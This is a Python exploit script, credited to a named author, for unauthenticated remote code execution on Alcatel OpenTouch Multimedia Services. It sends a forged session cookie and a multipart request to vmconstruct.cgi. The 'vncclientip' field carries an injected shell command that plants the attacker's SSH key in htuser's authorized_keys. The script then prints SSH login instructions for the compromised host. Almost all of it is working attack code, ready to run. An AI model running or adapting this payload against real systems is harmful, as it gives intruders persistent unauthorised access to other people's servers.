import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
import sys

class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'



print(bcolors.HEADER + '#################################################################################' + bcolors.ENDC)
print 'Unauthenticated Remote Code Execution Alcatel OpenTouch Multimedia Services'
print 'Author: Michal Blaszczak    https://blaszczakm.blogspot.com'
print 'Usage:    '
print '      python opentouch25.py  192.168.1.10  AAAAB3NzaC1yc2EAAAADAQABAAACAQCmehXdEf3zUnx3Xb2nqLrYqTGzUiQxtXtRg...UglaivoQxFaCsDC48L094wBO4BHUkBvuII7q1Vi40p6Fae2fjfrL41igtV...nPYJ63hXoIdF25agTEaBMbo07Wpkcd+/lV4jbbkPQvD8BCrSPGYZif5j22uzM7XnvqfEiOKCJM9x/q7xKnkOmluxhjmCcRvoDQ0O2PepOpzaeIfwXG9eVXdne1p60XACxr9VP+sTv/QGIdcy/sNo66+s5eicsMjwtY7vGExGxtXWZ5+UD3HWm1PcMUKIXWQCwC2cr77YrcKsCUjKh9kPDXjoXCodq3SUcvNidT+atakoS5n1lBPMEzo7jPyv7Bcldz0tmUrjvLCmz21QslkvUlRecwcy+To2F3sSCGDZI09tBAEyJGvZ7L2iDzS5eE3Dfie9+Ud...6Is86LlRwr6cVyUiicitWjNhKqNeb8O7NiQZYV4d1rVTEvV1tntn44eSzjKveqt4xgSgnl9DJSEiJUWs505c3bPJjNULR09eeKQp9TdhVS+Q3BVXnyRcw=='
print ''
print 'Arguments:'
print '       HOST/IP Alcatel OpenToch Multimedia Services'
print '       SSH_PUBLIC_KEY (ssh-rsa format)'
print(bcolors.HEADER + '#################################################################################' + bcolors.ENDC)

if len(sys.argv)<3:
    print '\n\n'+'read usage!'
    sys.exit(1)



target =  sys.argv[1]
key = sys.argv[2]



proxies = {
 "http": "http://127.0.0.1:8080",
 "https": "http://127.0.0.1:8080",
}

headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:68.0) Gecko/20100101 Firefox/68.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'Accept-Language': 'pl,en-US;q=0.7,en;q=0.3',
    'Content-Type': 'multipart/form-data;boundary=---------------------------19718198955447',
    'Connection': 'keep-alive',
    'Upgrade-Insecure-Requests': '1',
    'Cache-Control': 'max-age=0',
}

cookies = {
    'AlcUserId': '16C636164756C6F5F6471446D696E602F6471446D6230313831202745594021353832353437333439323339302D273530323930353230303738393033343835383',
}


data = '-----------------------------19718198955447'+"\r\n"+'Content-Disposition: form-data; name="mode"'+"\r\n\r\n"+'constructmanually'+"\r\n"+'-----------------------------19718198955447'+"\r\n"+'Content-Disposition: form-data; name="filename"'+"\r\n\r\n"+'-----------------------------19718198955447'+"\r\n"+'Content-Disposition: form-data; name="vncclientip"'+"\r\n\r\n"+'1.1.1.1; mkdir /home/htuser/.ssh/; echo "ssh-rsa '+key+' your_email@example.com" > /home/htuser/.ssh/authorized_keys'+"\r\n"+'-----------------------------19718198955447--'

response = requests.post('https://'+target+'/cgi-bin/vmconstruct.cgi', headers=headers, cookies=cookies,data=data,verify=False,proxies=proxies)

print ''
print ''
print ''

if response.status_code == 500:
    print(bcolors.OKGREEN + 'OK Host is VULNERABLE' + bcolors.ENDC)
    print 'You can now log in using SSH with your private key:'
    print ''
    print(bcolors.WARNING + 'ssh htuser@'+target+' -i id_rsa'
 + bcolors.ENDC)
    print ''
else:
    print(bcolors.FAIL + 'NOT VULNERABLE ;-(' + bcolors.ENDC)
